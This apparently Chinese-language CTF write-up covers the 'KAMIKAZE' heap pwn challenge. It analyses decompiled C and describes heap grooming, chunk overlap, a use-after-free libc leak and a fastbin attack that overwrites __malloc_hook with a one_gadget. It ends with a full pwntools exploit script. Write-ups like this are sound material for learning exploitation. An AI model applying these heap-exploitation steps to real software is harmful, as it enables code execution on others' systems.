---
title: hack it ctf (3)
date: 2018-10-11 00:00:00
categories:
- CTF/Pwn
tags:  Pwn
---

##  KAMIKAZE


本来我以为昨天那题目就够恶心了，妈的这个更恶心！！！恶心！！！


###  程序分析

```c
unsigned __int64 add()
{
  signed int n; // [rsp+8h] [rbp-48h]
  struct song *v2; // [rsp+10h] [rbp-40h]
  struct song *song_struct; // [rsp+18h] [rbp-38h]
  char nptr; // [rsp+20h] [rbp-30h]
  char buf; // [rsp+30h] [rbp-20h]
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  song_struct = (struct song *)calloc(0x28uLL, 1uLL);
  printf("Enter the weight of the song: ", 1LL);
  read(0, &buf, 0xDuLL);
  song_struct->weight = atoll(&buf);
  printf("Enter size of the stanza: ", &buf);
  read(0, &nptr, 4uLL);
  n = atoi(&nptr);
  if ( n <= 0 || n > 0x70 )
    exit(0);
  song_struct->stanza = (__int64)calloc(n, 1uLL);
  printf("Enter the stanza: ", 1LL);
  fgets((char *)song_struct->stanza, n, stdin);
  printf("Leave a short hook for it too: ", (unsigned int)n);
  read(0, song_struct->hook, 0x10uLL);
  v2 = (struct song *)head;
  if ( head )
  {
    while ( v2->next )
      v2 = (struct song *)v2->next;
    v2->next = (__int64)song_struct;
  }
  else
  {
    head = (__int64)song_struct;
  }
  return __readfsqword(0x28u) ^ v6;
}
```

增加一个结构体，其中hook没有截断

```c
unsigned __int64 kam()
{
  int i; // [rsp+Ch] [rbp-34h]
  int weight; // [rsp+10h] [rbp-30h]
  int seed; // [rsp+14h] [rbp-2Ch]
  struct song *v4; // [rsp+18h] [rbp-28h]
  char buf; // [rsp+20h] [rbp-20h]
  unsigned __int64 v6; // [rsp+28h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  printf("Enter song weight: ");
  read(0, &buf, 4uLL);
  weight = atoi(&buf);
  v4 = (struct song *)head;
  if ( head )
  {
    while ( v4->weight != weight )
    {
      if ( !v4->next )
      {
        puts("Couldn't find the song");
        exit(0);
      }
      v4 = (struct song *)v4->next;
    }
    printf("Enter seed: ", &buf);
    read(0, &buf, 4uLL);
    seed = atoi(&buf);
    if ( seed <= 1 || seed > 0xE )
      exit(0);
    for ( i = 0; i < strlen(v4->hook); ++i )    // can modify next chunk's head
      v4->hook[i] ^= seed;
  }
  else
  {
    puts("You need to create a song first");
  }
  return __readfsqword(0x28u) ^ v6;
}
```
注意到strlen函数会把下一个堆块的头部当作长度处理

配合这个函数可以达到offbyone那样的效果

### 思路

刚开始的思路是利用那个kamikaze函数将topchunk缩小，之后耗尽的时候会产生一个unsortedbin，然后还是利用kamikaze函数将mmp位改成1，绕过calloc，写八个字节就可以泄露处bk指针

然而！并不可以！！！

输入的时候使用的是fgets，会自动增加一个\x00，怎么泄露都泄露不了。。。

后来意外的发现要是多个fastbin连在一起的话，topchunk不够用的时候就可以合并成一个大的unsortedbin

之后同样利用kamikaze函数将其大小扩大，达到overlap的目的，构造uaf，泄露地址，fastbinattack一把梭

###  LEAK

说实话，这个的泄露是真的恶心，要十分的注意堆布局，而且这个程序的链表结构有问题，有时候会莫名其妙的报错，而且不能删除头节点，所以要十分小心

```python	
	add(0,0x20,'A'*0x10,'A'*0xf)
	add(1,0x20,'A'*0x10,'A'*0xf)
	add(2,0x20,'A'*0x10,'A'*0xf)
	delete(2)
	delete(1)
	delete(0)
```

首先搞一堆结构体大小的fastbin备用

```python
for i in range(19):
		if (i+19) == 25:
			add(i + 19,0x60,'padding','A'*0x10)
		else:
			add(i + 19,0x70,'padding','A'*0x10)#22
```

然后搞一堆大的堆块消耗topchunk
至于25号块就是uaf利用的堆块，至于我怎么知道的。。。我调了一天

把堆块搞成20xxx的时候就可以了，具体多少自己把握

```python
	add(100,0x70,'O'*0x10,'O'*0x10)
	add(1,0x60,'B'*0x40,'B'*0xf)
	delete(1)
	add(1,0x50,'C'*0x30,'C'*0xf)
	add(2,0x60,'B'*0x40,'B'*0x10)
	kam(2,2)
	kam(2,2)
```
然后构造修改tpchunk size条件，改掉它，因为要页对其，所以异或了两次

```python
for i in range(18):
		if (37-i) != 25:
			delete(37-i)
	delete(25)
	delete(1)
	add(1,0x60,'target','target')
	add(25,0x50,'fake','fake')
	
	
	for i in range(18):
		if (i+19) != 25:
			add(37-i,0x70,'padding','A'*0x10)
```

然后把25以及一号堆块互换，并把他们搞到链表前边去，因为后续的操作会破坏链表结构，所以一定要注意（本人调了至少一下午）

```python
	delete(0x25)
	delete(0x24)
	delete(0x23)
	delete(0x22)
	delete(0x21)

	add(99,0x20,'tmp','AAA')
	add(0x21,0x60,'padding','A'*0x10)
	add(0x22,0x60,'padding','A'*0x10)
	add(0x23,0x60,'padding','A'*0x10)
	delete(99)
	add(0x24,0x60,'padding','A'*0x10)
	add(0x25,0x30,'padding','A'*0x10)

	delete(0x25)
	add(0x25,0x10,'x','X'*0x10)
	add(18,0x30,'secunda','Z'*0x10)
	kam(18,2)
```

然后就是利用topchunk耗尽合并fastbin的机制构造unsortedbin，并将其扩大达到overlap的目的

```python
	#target 25 :base + 450
	#now unsorted: 310 + 30 + 70 + 30 + 70
	add(17,0x70,'padding','aaa')
	add(16,0x50,'padding','bbb')

	show(3)
	io.recvuntil('Stanza: ')
	leak = u64(io.recv(6).ljust(8,'\x00'))
	libc_base = leak - 0x10 - 0x58 - libc.symbols['__malloc_hook']
	mlh = libc_base + libc.symbols['__malloc_hook']
	one = libc_base + 0xf02a4
```

然后就是构造uaf条件泄露地址了

### getshell

uaf 有了，fastbin也有了，这里就不赘述了

### exp：

```python
from pwn import *
context.log_level = 'debug'

io = process('./kamikaze')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def p():
	gdb.attach(io)
	raw_input()
def choice(c):
	io.recvuntil('>>')
	io.sendline(str(c))
def add(weight,size,content,hook, p = False):
	choice(1)
	io.recvuntil(': ')
	io.sendline(str(weight))
	io.recvuntil(': ')
	io.sendline(str(size))
	io.recvuntil(': ')
	if p:
		io.send(content)
	else :
		io.sendline(content)
	io.recvuntil(': ')
	io.send(hook)
def delete(weight):
	choice(4)
	io.recvuntil(': ')
	io.sendline(str(weight))
def edit(weight,content):
	choice(2)
	io.recvuntil(': ')
	io.sendline(str(weight))
	io.recvuntil(': ')
	io.send(content)
def kam(weight,num):
	choice(3)
	io.recvuntil(': ')
	io.sendline(str(weight))
	io.recvuntil(': ')
	io.sendline(str(num))
def show(idx):
	choice(5)
	io.recvuntil(': ')
	io.sendline(str(idx))

def main():
	
	add(0,0x20,'A'*0x10,'A'*0xf)
	add(1,0x20,'A'*0x10,'A'*0xf)
	add(2,0x20,'A'*0x10,'A'*0xf)
	delete(2)
	delete(1)
	delete(0)
	for i in range(19):
		if (i+19) == 25:
			add(i + 19,0x60,'padding','A'*0x10)
		else:
			add(i + 19,0x70,'padding','A'*0x10)#22
	add(100,0x70,'O'*0x10,'O'*0x10)
	add(1,0x60,'B'*0x40,'B'*0xf)
	delete(1)
	add(1,0x50,'C'*0x30,'C'*0xf)
	add(2,0x60,'B'*0x40,'B'*0x10)
	kam(2,2)
	kam(2,2)
	for i in range(18):
		if (37-i) != 25:
			delete(37-i)
	delete(25)
	delete(1)
	add(1,0x60,'target','target')
	add(25,0x50,'fake','fake')
	
	
	for i in range(18):
		if (i+19) != 25:
			add(37-i,0x70,'padding','A'*0x10)
	delete(0x25)
	delete(0x24)
	delete(0x23)
	delete(0x22)
	delete(0x21)

	add(99,0x20,'tmp','AAA')
	add(0x21,0x60,'padding','A'*0x10)
	add(0x22,0x60,'padding','A'*0x10)
	add(0x23,0x60,'padding','A'*0x10)
	delete(99)
	add(0x24,0x60,'padding','A'*0x10)
	add(0x25,0x30,'padding','A'*0x10)

	delete(0x25)
	add(0x25,0x10,'x','X'*0x10)
	add(18,0x30,'secunda','Z'*0x10)
	kam(18,2)

	#target 25 :base + 450
	#now unsorted: 310 + 30 + 70 + 30 + 70
	add(17,0x70,'padding','aaa')
	add(16,0x50,'padding','bbb')

	show(3)
	io.recvuntil('Stanza: ')
	leak = u64(io.recv(6).ljust(8,'\x00'))
	libc_base = leak - 0x10 - 0x58 - libc.symbols['__malloc_hook']
	mlh = libc_base + libc.symbols['__malloc_hook']
	one = libc_base + 0xf02a4

	delete(16)
	add(60,0x60,'V'*5,'secunda')
	delete(2)
	delete(1)
	edit(60,p64(mlh - 0x23)[:6])
	log.success(hex(libc_base))
	add(59,0x60,'FFFFFFFFFF','FUCKU')
	add(58,0x60,'Y'*0x13+p64(one),'BITCH')
	delete(59)
	delete(60)
	io.interactive()
if __name__ == '__main__':
	main()
```